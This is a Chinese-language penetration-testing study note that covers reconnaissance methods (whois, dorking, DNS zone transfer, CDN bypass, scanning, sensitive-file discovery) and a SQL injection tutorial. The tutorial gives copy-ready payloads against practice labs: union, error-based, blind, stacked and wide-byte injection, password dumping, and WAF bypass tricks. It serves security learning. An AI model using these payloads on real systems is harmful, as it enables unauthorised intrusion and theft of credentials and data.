[web安全学习笔记](https://websec.readthedocs.io/zh/latest/index.html)

![afa2153f4366d7f188b6db22dc9a244](https://github.com/JackSparrowhk/north_hack/assets/108756180/4f4c9518-4f69-4e91-821a-860bfdbd32e8)

![5b53250abb86b21e61130b5645a0ed5](https://github.com/JackSparrowhk/north_hack/assets/108756180/ad906dec-ad30-4c1a-b72d-57862e7a2beb)

# 渗透流程

1.信息收集

2.漏洞探测

3.漏洞利用

4.内网渗透

5.权限提升（提权）

6.权限维持（后门）

7.痕迹清除

8.撰写报告

#   	三、信息收集

[信息收集思路总结](https://ylcao.top/2023/01/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/)

工具：

ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统

Maltego

## 1. 基本介绍

#### 1.1 信息收集的意义

* 信息收集是渗透测试成功的保障
* 获得更多的暴露面
* 更大的可能性

#### 1.2 分类

* 主动：直接访问网站，扫描，会留下日志信息
* 被动：基于公开的渠道，比如搜索引擎，不直接和目标系统直接交互

#### 1.3 收集目标

* 服务器信息
  * 端口、服务、真实IP

* 网站信息
  * 网站架构、指纹信息、WAF、敏感目录、旁站查询、C段查询

 * 域名信息
   * whois、备案信息、子域名

* 人员信息
  * 姓名、职务、生日、联系电话、邮件地址



## 2. 域名注册信息收集

#### 2.1 whois查询

​	你是谁？

| 站长之家           | http://whois.chinaz.com/         |
| ------------------ | -------------------------------- |
| 腾讯云域名信息查询 | https://whois.cloud.tencent.com/ |
| 微步在线           | https://x.threatbok.cn/          |
| 爱网站             | https://whois.aizhan.com/        |
| 万网域名信息查询   | https://whois.aliyun.com/        |

#### 2.2 备案信息（ICP）

​	备案号信息收集

​		http://www.beianbeian.com

​		http://www.beian.gov.cn/portal/index.io

​		http://icp.chinaz.com

## 3. 子域名信息收集

#### 3.1 Google Hacking

​	Web信息的搜索建立在：IP、域名、端口。

​	Google Hacking，也称作Google dorking，是一种利用谷歌搜索的高级使用方式进行信息收集的技术。

**语法：** 操作符:搜索对象	**不能有空格**

**基本运算符：**

| 逻辑与 | and（+） |
| ------ | -------- |
| 逻辑或 | or（\|） |
| 逻辑非 | not（-） |
| 小括号 | ( )      |
| 通配符 | *     ？ |

**特点：**

1. [布尔运算符](https://link.juejin.cn/?target=https%3A%2F%2Fcn.bing.com%2Fsearch%3Fq%3D%E5%B8%83%E5%B0%94%E8%BF%90%E7%AE%97%E7%AC%A6)和高级操作符可以结合使用；
2. 多个高级操作符可以在一次搜索中配合使用；
3. 以 `all` 开头的操作符在一次搜索中仅能使用一次，不能与其他高级操作符同时使用。

**基本的操作符**

**intext**

​	intext:str	搜索网站内容中包含str字符串的网站

**inurl**

​	inurl:login.php	搜索网站url中包含login.php的网站，一般用来查找后台页面。

**intitle**

​	intitle:后台管理	搜索网站标题中包含后台管理的网页

**site**

​	指定访问的站点，用来搜索某个域名下的所有被搜索引擎收录的页面。

> 语法结构：要查找的信息 site:去掉www后的网站地址
> 例如：网安 site:gov.cn
> 注意：“site” 后面跟的站点域名，不要带 “https://”。site:和站点之间不要有空格

​	可以把搜索范围限定在这个站点中，提高查询效率。

#### 3.2 基于字典暴力破解

​	工具：layer子域名挖掘机

​	字典：https://github.com/DNSPod/oh-my-free-data

#### 3.3 DNS区域传送漏洞

* **常见的DNS记录**

>A记录 		IP地址记录，记录一个域名对应的IP地址
>
>AAAA记录  IPv6地址记录，记录一个域名对应的IPv6地址
>
>CNAME记录  别名记录，记录一个主机的别名
>
>MX记录          电子邮件交换记录，记录一个邮件域名对应的IP地址
>
>NS记录      	域名服务器记录 ,记录该域名由哪台域名服务器解析
>
>PTR记录     	反向记录，也即从IP地址到域名的一条记录
>
>TXT记录    	 记录域名的相关文本信息
>
>SOA记录   	 start of anthorization 开始授权，一般二级域名才会有

​	

​	DNS 区域传送（DNS zone transfer）是指一台备用 DNS 服务器使用来自主 DNS 服务器的数据刷新自己的域（zone）数据库，从而避免主 DNS 服务器因意外故障影响到整个域名解析服务。

​	一般情况下，DNS 区域传送只在网络里存在备用 DNS 服务器时才会使用；但许多 DNS 服务器却被错误地配置，只要有客户机发出请求，就会向对方提供一个 zone 数据库的详细信息。因此，不受信任的因特网用户也可以执行 DNS 区域传送（zone transfer）操作。

​	恶意用户可以通过 DNS 区域传送快速地判定出某个特定 zone 的所有主机，并收集域信息、选择攻击目标，进而找出未使用的 IP 地址，绕过基于网络的访问控制窃取信息。

* **利用步骤**

1. 输入nslookup命令进入交互式shell
2. Server 命令参数设定查询将要使用的DNS服务器
3. Ls命令列出某个域中的所有域名

```powershell
PS C:\Users\user> nslookup
默认服务器:  UnKnown
Address:  192.168.212.20

> server 8.8.8.8
默认服务器:  dns.google
Address:  8.8.8.8

>ls

```



* **使用nmap扫描DNS域传送泄露漏洞**

````shell
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=thnu.edu.cn -p 53 -Pn IP地址
````

`nmap –script dns-zone-transfer`表示加载nmap文件夹下的脚本文件dns-zone-transfer.nse，扩展名.nse可省略

`–script-args dns-zone-transfer.domain=zonetransfer.me`向脚本传递参数，设置列出记录的域是nwpu.edu.cn

`-p` 53设置扫描53端口

`-Pn`:设置通过Ping发现主机是否存活


#### 3.4 跨域策略文件

​	crossdomain.xml，跨域策略文件，一般放在需要跨域的网站的根目录下，可以为多个域设置访问权限。

- 允许所有资源访问

```xml
<cross-domain-policy>
	<allow-access-from domain="pan.www.com" to-ports="22"/>
</cross-domain-policy>
```

#### 3.5 ssl证书查询

​	SSL证书通过在客户端浏览器和web浏览器之间建立一条SSL安全通道（Secure socket layer(SSL)），对传送的数据进行加密和隐藏，以保障数据的完整性。	

​	许多组织会选择签发可在多个网站使用的单一证书。例如，大型网站经常会为其资源使用多个子网域（如 www.google.com、mail.google.com、accounts.google.com），但会以单一证书指定所有这些子网域。

​	在线查询：https://csr.chinassl.net/ssl-checker.html

#### 3.6 js查询

控制台查询命令

```javascript
window.location.protocol+"//"+window.location.host; 	//返回https://domain
window.location.host; 		//返回url 的主机部分，例如：www.baidu.com 
window.location.hostname; 	//返回mp.csdn.net
window.location.href; 		//返回整个url字符串(在浏览器中就是完整的地址栏)
window.location.pathname; 	//返回/a/index.php或者/index.php  
window.location.protocol; 	//返回url 的协议部分，例如： http:，ftp:，maito:等等。  
window.location.port; //url 的端口部分，如果采用默认的80端口，那么返回值并不是默认的80而是空字符  
```

##### **1. JS中存在插件名字，根据插件找到相应的漏洞直接利用**

![image-20230708135338018](D:\26216\OneDrive\Desktop\信息收集.assets\image-20230708135338018.png)

​	https://rencaiceping.guazi.com/login.asp?c=1

##### **2. JS中存在一些URL链接**

![image-20230708143122287](D:\26216\OneDrive\Desktop\信息收集.assets\image-20230708143122287.png)

##### **3. 工具**

​	JSFinder

![image-20230708142649193](D:\26216\OneDrive\Desktop\信息收集.assets\image-20230708142649193.png)

`python3 JSFinder.py -u https://www.ksyun.com -ou ks_url.txt -os ks_sub.txt `

#### 3.7 其他常用工具

​	OneForAll（https://github.com/shmilylty/OneForAll.git）

​	SubdomainBrute

`python3 subDomainsBrute.py -o baidu.txt -t 200 baidu.com --no-https`

## 4. 网络信息

#### 4.1 IP查询

##### 4.1.1 常用命令及工具

1. nslookup

​			查询域名名称之间对应的关系

2. ping

​			探测目标主机是否存活

3. tracert（traceroute）

​			测试与远端电脑或者网络设备之间的路径

4. dnsenum

​		dnsenum——用于枚举域信息和发现不连续IP块的多线程脚本

5. IP反查域名

   ​	通过反查IP可以探测到同一IP地址下的多个域名。

   Dnslytics：https://dnslytics.com/reverse-ip

6. IP查询位置信息

   ​	[IP地址查询chaipip](http://chaipip.com/ip.php)

`curl ipinfo.io/目标ip或域名`

`curl`是一个命令行工具，用于通过URL发送HTTP请求。在这个命令中，`curl ipinfo.io/54.90.107.240`，它向`ipinfo.io`的服务器发送一个HTTP GET请求，请求的路径是`/54.90.107.240`。

`ipinfo.io`是一个提供IP地址信息的第三方服务，它可以通过IP地址查询到相关的地理位置信息。通过向`ipinfo.io`发送HTTP请求并指定一个IP地址作为路径参数，我们可以获取到该IP地址的相关信息。

具体来说，这个命令将会返回一个包含该IP地址所属国家、城市、运营商等信息的JSON格式数据。这些信息通常用于网络分析和网络监控等应用场景。

##### 4.1.2 CDN

​	CDN即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的
边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获
取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。

**寻找真实IP**

1.  **判断目标是否存在CDN**

* Ping目标主域

```powershell
PS C:\Users\user> ping www.dfle.com.cn

正在 Ping www.dfle.com.cn [218.107.207.39] 具有 32 字节的数据:
来自 218.107.207.39 的回复: 字节=32 时间=40ms TTL=117
来自 218.107.207.39 的回复: 字节=32 时间=40ms TTL=117
......
PS C:\Users\user> ping www.jd.com

正在 Ping wwwv6.jcloudimg.com [240e:b1:9801:203:8000::3] 具有 32 字节的数据:
来自 240e:b1:9801:203:8000::3 的回复: 时间=7ms
来自 240e:b1:9801:203:8000::3 的回复: 时间=7ms
......
```

​	通常通过ping目标主域，观察域名的解析情况，以此来判断其是否使用了CDN

* Nslookup

```powershell
PS C:\Users\user> nslookup
> www.jd.com 8.8.8.8
服务器:  [8.8.8.8]
Address:  8.8.8.8

非权威应答:
名称:    wwwv6.jcloudimg.com
Addresses:  240e:97d:10:1409:8000::3
          119.147.159.135
Aliases:  www.jd.com
          www.jd.com.gslb.qianxun.com
          www.jd.com.s.galileo.jcloud-cdn.com
```

​	通过使用观察Nslookup使用不同 DNS 的解析结果，判断是否存在CDN。若解析结果有多个，很有可能存在CDN，相反，若解析结果有一个，可能不存在CDN。

* 多地Ping

  ​	利用全国多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致， 如果都是一样的，极有可能不存在CDN。如果IP大多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。

​	http://webkaka.com/Ping.aspx

​	https://asm.cd.com/en/ping.php



2. **绕过CDN**

* 内部邮箱源

  ​	一般的邮件系统都在内部，没有经过CDN的解析，通过利用目标网站的邮箱注册、找回密码或者RSS订阅等功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名,就可以获得目标的真实IP。

​		注意：必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的。

* 国外DNS解析

  ​	寻找国外冷门的DNS,大部分CDN提供商只针对国内市场，对国外市场几乎不做CDN。

  * [世界各地DNS服务器地址大全](http://ip.yqie.com/dns.htm)

* 国际Ping

  ​	很多时候国内的CDN对国外得覆盖面并不是很广，故此可以利用此特点进行探测。通过国外代理访问就能查看真实IP了，或者通过国外的DNS解析，可能就能得到真实的IP。

  国际ping测试站点

  * [ipip](https://tools.ipip.net/newping.php)
  * [ASM](https://asm.ca.com/en/ping.php)

#### 4.2 端口扫描

​	在对目标进行漏洞挖掘的过程中，对端口信息的收集是一个很重要的过程， 通过扫描服务器开放的端口以及从该端口判断服务器上存在的服务，就可以对症下药，便于我们渗透目标服务器。所以在端口渗透信息的收集过程中，我们需要关注常见应用的默认端口和在端口上运行的服务。

​	端口一般是指TCP/IP协议中的端口，端口号的范围是从0-65535。

**常见利用端口**

| FTP        | 21           |
| ---------- | ------------ |
| SSH        | 22           |
| Telnet     | 23           |
| POP3       | 110          |
| Sql Server | 1433         |
| MySQL      | 3306         |
| 3389       | mstsc        |
| 8080       | Tomcat/Jboss |
| 9090       | WebSphere    |

**工具**

nmap

`nmap -p 80 -Pn IP地址`

​	扫描目标主机的80端口，忽略发现主机的环节

masscan

`masscan --range ip --ports 0-65535 --range 100000`

## 5. 站点信息

​	**整站分析**：

![image-20230707092337145](D:\26216\OneDrive\Desktop\信息收集.assets\image-20230707092337145.png)

​	Goby

#### 5.1 网站指纹

​	网站指纹是 Web 服务组件在开发时留下的类型、版本等标记信息，包括 Web服务器指纹、Web运用指纹及前端框架指纹等。我们可以通过前端网页和返回一些 HTTP 头信息来判断网站使用的哪些开发框架、服务器、系统。

* 这个网站用什么开源系统？

* 什么CMS系统做的？

- 用什么论坛系统做的？ 

- 用哪个技术架构做的？



**指纹浏览器：**AdsPower、multilogin、林肯等



##### 5.1.1 架构及分析思路

​	大多数 web 应用可以粗略划分为三个组件(component)。

1、客户端，大多数情况下是浏览器（B/S架构）。

2、服务端, Web服务器接收客户端的HTTP请求并进行响应。另外，有时候 Web服务器只转发请求到应用服务器(Application Server)，由应用服务器来处理请求。

3、后端存储, 后端存储一般是DBMS，用于查询和存储数据。

​	所有组件都有不同行为，这些不同行为将影响[漏洞](https://link.zhihu.com/?target=http%3A//www.cjzzc.com/article/1110.html)的存在性和可利用性。所有组件(无论是客户端还是服务端)都有可能产生漏洞或者其他安全问题。

<img src="D:\26216\OneDrive\Desktop\信息收集.assets\image-20230708165143959.png" alt="image-20230708165143959" style="zoom:80%;" />

##### 5.1.2 收集目标

1、Web服务器名称，版本

2、Web服务器后端是否有应用服务器

3、数据库(DBMS)是否部署在同一主机(host)，数据库类型

4、是否使用反向代理(reverse proxy)

5、是否使用负载均衡(load balancing)

6、Web应用使用的编程语言



**目的**：识别出相应的==cms==或者==web容器==

##### 5.1.3 CMS指纹识别

​	CMS（Content Management System）内容管理系统，可帮助公司管理数字内容，使没有技术背景的人也能轻松发布内容（一键建站）。

使用CSM建站的原因：

​	有些公司没有专门设计网站的人员,用CMS平台可以迅速上线项目,还有些学校、企业网站的管理员本身就不是程序、网站设计人员他们会找外包公司来做自己的网站,这些公司有可能就用了某种CMS，节省了时间、人力成本。

**CMS的分类**

1. 耦合 CMS： 通常称为传统 CMS，内容与前端紧密结合。
2. SaaS CMS：同样是一个完整的端到端解决方案，由云提供商开发和维护，并提供自动软件更新。
3. 分离 CMS：网站的展示部分与后端“分离”。交付系统位于网站展示与后端之间，并通过应用程序编程接口 (API) 访问后端。
4. 无头 CMS：只有一个后端系统，定制化，更加灵活。



**常见的CMS类别**

* **php**类：dedeCMS、帝国CMS(EmpireCMS)、php168、phpCMS、cmstop、discuz、phpwind等
* **asp**类：zblog、KingCMS等
* **.net**类：EoyooCMS等
* 国外的著名cms系统：joomla、WordPress 、magento、drupal 、mambo等

cms指纹识别：御剑

CMS漏洞查询：https://www.exploit-db.com/

##### 5.1.4 Web容器

​	Servlet：实现动态页面交互的一种技术。



![c64be7a09d17ac9501948f2a2ac16fa](C:\Users\16159\AppData\Local\Temp\WeChat Files\c64be7a09d17ac9501948f2a2ac16fa.png)

​	常见的Servlet容器：Tomcat、jboss、weblogic

> 

#### 5.2 旁站C段

##### 5.2.1 **旁站**

​	旁站指的是同一服务器上的其他网站，在大多数情况下，暴露面广的网站入侵难度也相对较高。因此，可以查看该网站所在的**服务器**上是否还有其他网站。如果存在旁站，则可以先拿下旁站的管理权限，再提权拿到服务器的权限，或依此拿下该网站。

##### 5.2.2 **C段**

​	C段是和目标机器ip处在同一个**C段**的其它机器，通过目标所在C段的其他任一台机器，跨到目标机器。

##### 5.2.3 常用工具

旁站和C段在线查询地址：
http://www.webscan.cc/

http://stool.chinaz.com/same

工具：k8旁站、御剑1.5



### 6. 敏感信息

#### 6.2 WAF识别

​	WAF（Web Application Firewall），是一种用于防护Web漏洞的Web应用防火墙。通过监控、检测和阻止恶意的 Web 流量，保护 Web 应用程序免受常见的攻击，并提供日志记录和报告功能，以提高应用程序的安全性和可用性。

​	wafw00f *需要扫描的域名或端口*

#### 6.4 敏感目录/文件

​	目录扫描可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构。通过目录扫描我们还能扫描敏感文件，后台文件，数据库文件，和信息泄漏文件等等。通常我们所说的敏感文件、敏感目录大概有以下几种。

**常见敏感文件或目录**

> - robots.txt
>
> - 数据库log
>
> - sitemap.xml
>
> - mysql管理页面
>
> - .cvs源代码泄露
>
> - licence.txt
>
> - 网站备份文件
>
> - vim编辑器备份文件
>
> - WEB-INF/web.xml
>
> - /etc/shadow  root密码存放文件
> - bak文件	#备份文件，原始文件后缀加上.bak
> - phps源码泄露	#phps文件为php源代码文件，可通web浏览器直接查看php代码内容（例：index.phps）
>
> - www.zip 源码泄露
>   存在www.zip文件，下载即可得到web目录源码
> - .git泄露
>   存在/.git目录，使用工具[GitHack](https://github.com/lijiejie/GitHack)
> - .svn泄露
>   存在/.svn目录，实用工具[svnExploit](https://github.com/admintony/svnExploit)
> - .DS_Store
>   .DS_Store 文件利用 .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单；进入目录会下载一个文件，放到linux下，可以直接cat命令打开
> - vim缓存文件
>   在vim编辑文本时创建的临时文件，异常退出时会保留
>   例：原文件为index.php，第一次产生的缓存文件为 .index.php.swp
>   第二次意外退出后，文件为.index.php.swo
>   第三次产生的缓存文件为 .index.php.swn
>   注意：index前有 " . "
> - mdb文件
>   mdb文件是早期asp+access构架的数据库文件，直接查看url路径添加/db/db.mdb，下载文件通过txt打开，搜索特定字符串即可
> - 探针文件
>   多在题目提示中泄露未删除的探针文件

**常用工具**

> dirbuster
>
> dirb
>
> dirsearch
>
> 御剑

# 四、web漏洞

## 1、SQL注入漏洞

访问不到靶场解决办法：

/etc/hosts下加一条`主机ip	域名`

网站输入http://sqli即可访问到

![image-20230901215605803](https://github.com/JackSparrowhk/north_hack/assets/108756180/bfce9bdc-c79f-4a2d-9067-78110a34a369)


### 1.1 漏洞概述

​	原理：在与用户交互的程序中，用户的输入拼接到SQL语句中，执行了与原定计划不同的行为，从而产生了

SQL注入漏洞

​	SQL：结构化查询语言，所有的数据库管理系统（MySQL）均使用该语言结构化数据，而数据库管理系统通过==数据库存储引擎==（InnoDB）来操作数据。

​	MySQL在5.0版本后引入了information_schema数据库，其中包含了MySQL数据库中所有表的表名（tables.table_schema）和字段(columns.table_name)。

万能密码:admin' or 1=1 #

危害：数据库丢失，账户密码泄露，拒绝服务

**web网络三层架构：**

表示层（界面层）-->业务逻辑层（asp、php、java）-->数据访问层（MySQL）

**==任何用户输入且与数据库交互的地方都可能存在Sql注入漏洞==**

**判断漏洞是否存在的前提条件：**

即在存在注入点的位置后添加特殊字符，一般为单引号或双引号，查看页面是否不同，来判断是否存在注入点

1.与数据库交互

2.用户可控

### 1.2漏洞分类

##### 1.2.1注入点类型

数字型：

```php
1 and 1=2		#报错

1'and 1='2			#报错

1'and 1='1			#报错
    
当输入的参 x 为整型时，通常 abc.php 中 Sql 语句类型大致如下：

select * from <表名> where id = x

这种类型可以使用经典的 and 1=1 和 and 1=2 来判断：

Url 地址中输入 http://xxx/abc.php?id= x and 1=1 页面依旧运行正常，继续进行下一步。
Url 地址中继续输入 http://xxx/abc.php?id= x and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。


原因如下：

当输入 and 1=1时，后台执行 Sql 语句：

select * from <表名> where id = x and 1=1
没有语法错误且逻辑判断为正确，所以返回正常。

当输入 and 1=2时，后台执行 Sql 语句：

select * from <表名> where id = x and 1=2
没有语法错误但是逻辑判断为假，所以返回错误。

我们再使用假设法：如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：

select * from <表名> where id = 'x and 1=1' 
select * from <表名> where id = 'x and 1=2'
查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。
```

字符型：	

```php
id=1 and 1=2		#正常
    
1'and 1='2			#正常（返回为空）

1'and 1='1			#正常
    
当输入的参 x 为字符型时，通常 abc.php 中 SQL 语句类型大致如下：

select * from <表名> where id = 'x'

这种类型我们同样可以使用 and '1'='1 和 and '1'='2来判断：

Url 地址中输入 http://xxx/abc.php?id= x' and '1'='1 页面运行正常，继续进行下一步。
Url 地址中继续输入 http://xxx/abc.php?id= x' and '1'='2 页面运行错误，则说明此 Sql 注入为字符型注入。


原因如下：

当输入 and '1'='1时，后台执行 Sql 语句：

select * from <表名> where id = 'x' and '1'='1'
语法正确，逻辑判断正确，所以返回正确。

当输入 and '1'='2时，后台执行 Sql 语句：

select * from <表名> where id = 'x' and '1'='2'
语法正确，但逻辑判断错误，所以返回错误。同学们同样可以使用假设法来验证。
```

###### **注释符**

- `#`
- `--+`
- `/*xxx*/`
- `/*!xxx*/`
- `/*!50000xxx*/`

##### 1.2.2注入点位置

Get、Post、Http头注入（UA、Reference、）、Cookie注入

##### 1.2.3回显状态

报错注入（有回显）

盲注（时间盲注、布尔盲注）

##### 1.2.4其他形式

宽字节注入、二阶注入、堆叠注入

##### 1.2.5绕过技巧

- - **编码绕过**

    大小写

    url编码

    html编码

    十六进制编码

    unicode编码

- - **注释**

    `//` `--` `-- +` `-- -` `#` `/**/` `;%00`内联注释用的更多，它有一个特性 `/!**/` 只有MySQL能识别

    e.g. `index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3`

- - **只过滤了一次时**

    `union` => `ununionion`

- - **相同功能替换**

    **函数替换:**

    `substring` / `mid` / `sub`

    `ascii`/ `hex` / `	`

    `benchmark` / `sleep`

    **变量替换:**

    `user()` / `@@user`

    **符号和关键字:**

    `and` / `&``or` / `|`

- - **HTTP参数**

    HTTP参数污染`id=1&id=2&id=3` 根据容器不同会有不同的结果HTTP分割注入

- - **缓冲区溢出**

    一些C语言的WAF处理的字符串长度有限，超出某个长度后的payload可能不会被处理

- 二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过

### 1.3联合注入

union select：他会把查询的内容拼接到表的下方，==两个要查询的表的字段数量要相等，数据类型也要相同==

**get流程：**

```sql
# 一、判断注入点的类型
# 二、判断表有几个字段

?id=1' order by 3 --+

# 三、判断哪个字段有回显

?id=-1' union select 1,2 --+

# 四、判断数据库、表名、字段名
?id=-1' union select 1,database() --+

?id=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'  --+

?id=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='dvwa' --+

# 五、查看表中字段的值

?id=-1' union select 1,group_concat(first_name,':',password) from dvwa.users --+
```

**Post流程**

​	使用Burpsuite代理来做重发

### 1.4报错注入

##### 1.4.1updatexml

updataxml(exp1,**exp2**,exp3)：替换指定路径下xml文件的内容

exp1：查询的内容

exp2：X-Path

exp3：替换的内容

报错原理：

```sql
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+

123' and (updatexml(1,concat(0x5c,version(),0x5c),1)) --+#     爆版本

123' and (updatexml(1,concat(0x5c,database(),0x5c),1)) --+#    爆数据库
 
 123' and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1)) --+#      爆表名

123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x5c),1)) --+#爆字段名
 
123' and (updatexml(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c),1)) --+#爆密码该格式针对mysql数据库。

爆其他表就可以，下面是爆emails表
123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='emails'),0x5c),1))#
 
1' and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。
```

substr(exp,offset,length)

exp:要查询的语句

offset：偏移量

length：长度/显示的位数

##### 1.4.2 extractvalue

extractvalue(exp1,X-Path):查询xml文件中指定的内容

exp1：查询的内容

X-Path: 路径

```sql
爆路径：
?id=1' and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+

爆版本：
and extractvalue(1,concat(0x5c,version(),0x5c))--+    

爆数据库：
1' and extractvalue(1,concat(0x5c,database(),0x5c))  --+
 
爆表名：
1' and extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)) --+

爆字段名：
1' and extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x5c)) 
 
爆字段内容该格式针对mysql数据库：
1' and extractvalue(1,concat(0x5c,(select password from (select password from users where username='admin1') b) ,0x5c)) --+      

爆字段内容：
1' and extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)) --+
```



##### 1.4.3group by重复键冲突

count(*):返回表中的行数

​	直接加字段名：返回字段值不为空的行数

​	distinct 字段名：返回字段值不重复且不为空的行数

rand():随机生成一个0~1的数

floor():返回**小于等于**该值的最大整数值

group by:以指定组名排序，组名可以自定义

```sql
select username x from users group by x;

select username as x from users group by x;
```

### 1.5盲注

###### 1.5.1布尔盲注

Less-8

length(str):统计字符串的长度

substr(exp,offset,length):对一个字符串取子字符串（mid,left与substr类似）

like ‘%关键字%’：以关键字搜索

ascii():取字符的ascii编码，类似的有ord()

```sql
# 判断数据库的名
and length (database())=8 --+					查出库名长度
and ascii(substr(database(),1,1))='110' --+		查看库名第一个字母的ASCII

# 判断数据库的表名
and length((select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1))=8 --+									 查出表名长度

and ascii(substr((select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),1,1))>98 --+						 查看表名第一个字母的ASCII
```

###### 1.5.2 时间盲注

Less-10

sleep(num):让语句延迟执行

​	num：语句延迟执行的时间

if(exp1,exp2,exp3):判断exp1的正确与否，并以此执行后面的表达式

正确则执行exp2，否则执行exp3

```sql
and sleep(3) --+

and if (length(database())=8,sleep(3),1) --+

 and if(left(database(),1)='s',sleep(5),1)--+

and if(left(database(),8)='security',sleep(5),1)--+

and if( left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='u' ,sleep(5),1)--+

and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' ,sleep(5),1)--+

and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+

and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+
```

### 1.6 二阶注入

Less-24

注入两次：

第一次：向数据库中插入注入语句，为下一次注入做准备

第二次：利用第一次的语句

示例：

1.注册一个admin’#的用户

2.登录并修改密码

```php
UPDATE users SET PASSWORD='$pass' where username='$username' and password='curr_pass'
```

二次SQL注入（Second-Order SQL Injection）是一种特殊类型的SQL注入攻击。与一般的SQL注入攻击类似，攻击者会通过输入恶意的SQL语句来执行非法操作。而二次SQL注入则是指攻击者在应用程序中注入恶意的数据，然后等待应用程序将这些数据存储在数据库中。当应用程序再次从数据库中读取这些数据时，恶意数据就会被读取出来，并执行恶意操作。

例如，一个web应用程序可能会将用户输入的内容存储在数据库中，然后在后续的页面中将这些内容显示出来。如果攻击者在用户输入中注入了恶意SQL语句，那么这些语句会被存储在数据库中。当应用程序从数据库中读取这些内容并在后续的逻辑中使用时，恶意SQL语句就有可能被执行，从而导致攻击成功。

与一般的SQL注入攻击相比，二次SQL注入攻击更加难以防范和检测，因为攻击者并不直接向应用程序发送恶意SQL语句，而是将其存储在数据库中等待应用程序读取。因此，防止二次SQL注入攻击需要采取一些特殊的防御措施，例如对输入数据进行更加严格的过滤和转义处理，使用预编译等。

[Next ](https://websec.readthedocs.io/zh/latest/vuln/sql/cheatsheet/index.html)[ Previous](https://websec.readthedocs.io/zh/latest/vuln/sql/bypass.html)

### 1.7宽字节注入

Less-32

原理：利用mysql的GBK编码特性，在第一个字节的编码值大于128时，将两个字节识别为一个汉字。

应用场景：存在反斜杠（\）来转译单引号或其他闭合的时候，使用宽字节。

一般程序员用gbk编码做开发的时候，会用 `set names 'gbk'` 来设定，这句话等同于

```
set
character_set_connection = 'gbk',
character_set_result = 'gbk',
character_set_client = 'gbk';
```

漏洞发生的原因是执行了 `set character_set_client = 'gbk';` 之后，mysql就会认为客户端传过来的数据是gbk编码的，从而使用gbk去解码，而`mysql_real_escape`是在解码前执行的。

宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）

当我们在?id后输入`1’`输出时，会对引号转义为`\'`，出现反斜杠，说明我们可以试试宽字节注入。

反斜杠（\）代表%5c，那么在1与引号中间插入一个汉字（ascii码大于128），就可以绕过



解决的办法有三种，第一种是把client的charset设置为binary，就不会做一次解码的操作。第二种是是 `mysql_set_charset('gbk')` ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。 第三种就是用pdo。

还有一些其他的编码技巧，比如latin会弃掉无效的unicode，那么admin%32在代码里面不等于admin，在数据库比较会等于admin。

### 1.8堆叠注入

Less-38

后端使用了mysqli_multi_query()的函数，可以执行多条sql语句，通过拼接恶意语句的方式    `;`    可以实现堆叠注入

危害：添加、修改、破坏数据库数据

payload：

```sql
?id=1';update users set password=123 where id=1;--+
```

与联合查询区别：联合查询的语句类型是有限的，只能执行查询语句，而堆叠注入可以执行任意的语句，如增删改查

### 1.9 sqlmap

详细使用教程：https://blog.csdn.net/smli_ng/article/details/106026901

###### Sqlmap介绍

sqlmap是一款开源测试工具，能够识别数据库指纹，从获取数据到访问底层文件系统。

下载地址：http://sqlmap.org/

```shell
sqlmap --version	# 查看版本
sqlmap -h			# 查看基本帮助信息
sqlmap -hh			# 查看高级帮助信息
sqlmap -u url		# 探测数据库
sqlmap --update		# 更新sqlmap
sqlmap --purge 		# 清除sqlmap的数据
```

###### **直连数据库**

1. 服务型数据库（MySQL、Oracle、Microsoft SQL Server、PostgreSQL）

```shell
# 已知数据库用户名和密码
# 获取版本信息、用户
sqlmap -d "mysql://root:123456@192.168.1.100:3306/dvwa" -f --banner --users

```

2. 文件型数据库（SQLite，Access，Firebird）

​		已知绝对路径

###### **从文件中读取目标**

```shell
-l：从Burpsuite proxy或WebScarab Proxy中读取Http请求日志文件

-m：从多行文本格式文件读取多个目标

